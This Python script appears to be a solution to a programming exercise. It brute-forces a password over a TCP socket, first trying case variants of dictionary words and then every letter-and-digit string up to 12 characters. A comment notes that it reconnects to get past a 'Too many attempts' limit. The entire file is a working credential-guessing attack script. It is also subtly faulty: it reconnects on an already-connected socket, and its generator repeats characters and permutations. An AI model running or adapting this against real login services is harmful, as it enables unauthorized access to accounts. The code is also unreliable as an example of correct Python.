import socket
import sys
from itertools import combinations_with_replacement, permutations, chain, product
from string import digits, ascii_letters


def run(host, port, passwords):
    with socket.socket() as st:
        st.connect((host, port))
        attempt = 0
        for password in passwords:
            attempt += 1
            st.send(password.encode())
            response = st.recv(1024).decode()
            if response == "Connection success!":
                return password
            if response != "Wrong password!":
                raise Exception("Something went wrong!")
            if attempt == 999_999:  # reconnect to prevent "Too many attempts" / this value can be passed as argument
                st.connect((host, port))
                attempt = 0


def password_gen(pass_max_len):
    ch = chain()
    for i in range(1, pass_max_len + 1):
        ch = chain(*ch, digits, ascii_letters)
        for c in combinations_with_replacement(ch, i):
            for p in permutations(c, i):
                yield "".join(p)


def read_lines_from_file(path):
    with open(path) as file:
        return file.read().split("\n")


def dict_based_gen(dictionary):
    for line in dictionary:
        for password in product(*[c + c.upper() for c in line]):  # example:  "hack" -> "hH", "aA", "cC", "kK"
            yield "".join(password)


# try typical passwords first
result = run(sys.argv[1], int(sys.argv[2]), dict_based_gen(read_lines_from_file("dictionaries/typical_passwords.txt")))
if result:
    print(result)
else:
    print(run(sys.argv[1], int(sys.argv[2]), password_gen(12)))
